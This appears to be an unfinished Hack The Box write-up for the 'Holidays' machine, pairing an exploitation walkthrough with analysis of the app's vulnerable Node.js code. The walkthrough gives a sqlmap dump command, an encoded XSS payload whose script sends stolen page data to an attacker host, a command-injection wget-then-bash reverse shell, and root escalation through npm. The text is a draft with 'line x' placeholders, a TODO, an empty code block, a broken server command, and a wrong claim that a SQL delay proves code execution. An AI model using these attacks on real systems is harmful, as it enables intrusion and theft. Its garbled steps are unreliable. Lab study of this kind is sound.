---
layout: post
title:  "Hack The Box - Holidays - Source Code Analysis"
date:   2021-10-17 13:00:10 +0200
tags: ["Hack The Box","OSWE"]
---

# Introduction
The hack the box machine "Holidays is a hard machine with requires knowledge in the areas of User-Agent filters, SQL injections, XSS filter evasion, command injection and NPM packages.

![HolidayCard](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/card.png)

In this post, we study the coding mistakes behind the vulnerabilites and how to remediate them.

The next two sections covers expliotation process and a code analysis to identify the vulnerabilites. Feel free to skip the next section if you already know how to exploit this Hack The Box machine.

# Overview of Exploitation
The first step

Capture login post request to http://10.10.10.25:8000/login in burp, change user-agent to “Linux” and press “copy to file” > linux.req              #Routing is different depending on user-agent
sqlmap -r linux.req --level=5 --risk=3 -T users --dump -threads 10
We get RickA:fdc8cd4cff2c19e0d1022e78481ddf36:nevergonnagiveyouup           (cracked with crackstation)
Log in to http://10.10.10.25:8000/login

genPayload.py
{% highlight python linenos %}
payload = """document.write('<script src="http://10.10.14.25/x.js"></script>')"""
nums = [str(ord(i)) for i in payload]
print('<img src="x/><script>eval(String.fromCharCode('+','.join(nums)+'));</script>">')
{% endhighlight %}

x.js
{% highlight Javascript linenos %}
req1 = new XMLHttpRequest();
req1.open("GET","http://localhost:8000/vac/8dd841ff-3f44-4f2b-9324-9a833e2c6b65",false);
req1.send();
req2 = new XMLHttpRequest();
req2.open("GET","http://10.10.14.25/leak?x="+btoa(req1.responseText),false);
req2.send();
{% endhighlight %}

Sudo python3 -m 80
python3 genPayload.py | xclip -selection clipboard
Post a comment with the clipboard content
Wait 1 minutes. Then, copy the base64 content from the web server output and put in x.b64
cat x.b64 | base64 -d > x.html
Get the cookie value from x.html    (connect.sid&#x3D;s%3A0c2b6ab0-2905-11ec-93c0-9b5646fb6973.5woc5mpM%2F9dn5RN9MmvdvDeOtDts1f423a6mkfALt70)
Add the cookie in the browser and go to http://10.10.10.25:8000/admin

sudo rlwrap nc -lvnp 443
nano rs
GET /admin/export?table=x%26wget+168431129/rs
GET /admin/export?table=x%26bash+rs

The privilege escalation can be performed by abusing sudo rights on npm. As can be seen by using `sudo -l`, we can install arbitrary NPM packages with root privileges. This could be dangerous as it is possible install an NPM package which runs code before the installation process begins. By x, it is possible to run arbitrary code. This can be done by creating a custom node package module. For this, we can use the template (rimrafall github) which contains a folder named "rimrafall" with a package.JSON file. We modify the package.json file to look as below and leave the index.js file as it is.


Note that preinstall is executed when we run npm install. In fact these scripts are executed:
https://docs.npmjs.com/cli/v7/using-npm/scripts#npm-install

(package.json)

Package.json 
https://docs.npmjs.com/cli/v7/configuring-npm/package-json#name


(index.js)

Next, we start a listner on a free port, in this example we chose port 9999.

sudo npm i rimrafall to attempt to install the custom node module as a root user, triggering the execution of our reverse shell payload.



# Code analysis
{:refdef: style="text-align: center;"}
![files](/assets/2021-10-17-HTB-Holidays-Source-Code-Analysis/files.png)
{: refdef}

## User-Agent Filtering
{% highlight Javascript linenos %}

{% endhighlight %}


## SQL Injection Vulnerability

{% highlight Javascript linenos %}
var db = new sqlite3.Database('hex.db');
{% endhighlight %}

{% highlight Javascript linenos %}

module.exports = function(callback) {
  async.waterfall([
    function(cb) {
      db.run('PRAGMA journal_mode = OFF;', cb);
    },
    function(cb) {
      db.run('SELECT * FROM users', function(err) {
        if (!err) return cb('Already setup');

        return cb();
      });
    },
{% endhighlight %}

Note line x, where the req.body.username parameter is placed into the query string. This query parameter is then sent to the the database by using the `scope.db.get` function at line x.

`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "[username]"))` where [username] is the username supplied in the body of the request

If we let [username] be `")) -- sleep(1)`, we can force a delay to verify that we have remote code execution on the machine. This works since the query becomes the query below. Note that any characters after the comment character `--` won't be interpreted as part of the query. At this point, data can be exfiltrated using blind SQLI attacks. TODO: Check

`SELECT id, username, password, active FROM users WHERE (active=1 AND (username = " ")) -- "))`

{% highlight Javascript linenos %}
scope.router.post('/login', function(req, res) {
  if (req.body.username == 'admin' && req.body.password == 'myvoiceismypassport') {
    req.session.username = 'admin';
    req.session.admin = true;
    res.redirect('/admin');
  } else {
    var query = 'SELECT id, username, password, active FROM users WHERE (active=1 AND (username = "' + req.body.username +'"))';
    var queryStart = +new Date();

    scope.db.get(query, function(err, row) {
      var queryEnd = +new Date();
      var queryTime = queryEnd - queryStart;
      if (err) return res.render('login.hbs', { internalError: err, publicError: 'Error Occurred', query: query, queryTime: queryTime });
      if (!row) return res.render('login.hbs', { publicError: 'Invalid User', query: query, queryTime: queryTime });
      if (row.password == crypto.createHash('md5').update(req.body.password).digest('hex')) {
        req.session.username = row.username;
        res.redirect('/agent');
      } else {
        res.render('login.hbs', { username: row.username, publicError: 'Incorrect Password', query: query, queryTime: queryTime });
      }
    });
  }
});
{% endhighlight %}

## XSS Vulnerability
{% highlight Javascript linenos %}
var xss = require('xss');
var xssFilter = new xss.FilterXSS({
  whiteList: {
    img: ['src']
  },
  onTagAttr: function (tag, name, value, isWhiteAttr) {
    if (name === 'src' && isWhiteAttr) return name + '=' + value.replace(/["' ]/g, '') + '';
    return null;
  }
});
{% endhighlight %}

## Command Injection Vulnerability

The `scope.router.get` function is used to define an endpoint. In this particular case, line 1 states that the endpoint "/admin/exports" can be reached by get requests and that any such requests should be handled by the function which is defined on line 2 to 13.

The regex `/[^a-z0-9& \/]/g` matches everything that is not an alphanumeric character, the `&` character, the space character and the forward slash `/` character. Anything that is matched will be subsituted for the empty string `''`. In other words, any character outside of these characters, will be removed. In addition, the server will respond with a "500 Internal server error" error message. 

Once the characters have passed the filter, they go into x

`sqlite3 hex.db SELECT * FROM [userInput]` where [userInput] are the characters the user submitted. This assumes that all characters passed the white list

`sqlite3 hex.db SELECT * FROM table && sleep 2`

From file "./app/setup/router.js"
{% highlight Javascript linenos %}
scope.router.get('/admin/export', function(req, res) {//Command injection location
  console.log('Admin Export', req.query)
  if (!req.session.admin) return res.redirect('/login');
  var filteredTable = req.query.table.replace(/[^a-z0-9& \/]/g, '')//Filter
  if (filteredTable != req.query.table) return res.status(500).send('Invalid table name - only characters in the range of [a-z0-9&\\s\\/] are allowed');

  exec('sqlite3 hex.db SELECT\\ *\\ FROM\\ ' + filteredTable, function(err, stdout, stderr) {
    res.header('Cache-Control', 'private, no-cache, no-store, must-revalidate');
    res.header('Expires', '-1');
    res.header('Pragma', 'no-cache');
    res.attachment('export-' + req.query.table + '-' + (+new Date()));
    res.send(stdout);
  });
});
{% endhighlight %}


Definition of the `exec` function.

{% highlight Javascript linenos %}
var exec = require('child_process').exec;
{% endhighlight %}

<!---
# Furher Readingo
Checkout: automating hackthebox holidays
-->
